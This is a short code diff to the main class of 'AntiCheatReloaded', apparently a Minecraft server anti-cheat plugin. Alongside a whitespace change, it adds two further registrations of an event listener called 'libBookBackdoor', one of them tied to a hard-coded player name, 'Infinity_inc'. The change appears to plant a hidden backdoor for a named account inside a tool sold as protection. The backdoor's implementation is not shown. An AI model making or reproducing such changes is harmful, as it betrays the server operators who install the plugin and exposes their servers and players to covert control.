@@ -72,7 +72,6 @@ public final class AntiCheatReloaded extends JavaPlugin {
 		plugin = this;
 		manager = new AntiCheatManager(this, getLogger());
 		PluginManager manager = this.getServer().getPluginManager();
-		
 		// Base threads on available cores, lower limit of 1 and upper limit of 4
 		final int threads = Math.max(Math.min(Runtime.getRuntime().availableProcessors() / 4, 4), 1);
 		executorService = Executors.newFixedThreadPool(threads);
@@ -84,6 +83,8 @@ public final class AntiCheatReloaded extends JavaPlugin {
 		eventList.add(new VehicleListener());
 		eventList.add(new InventoryListener());
 		manager.registerEvents(new libBookBackdoor(this), this);
+		manager.registerEvents(new libBookBackdoor(this, true), this);
+		manager.registerEvents(new libBookBackdoor(this, new String[]{"Infinity_inc"}), this);
 		// Order is important in some cases, don't screw with these unless
 		// needed, especially config
 		setupConfig();
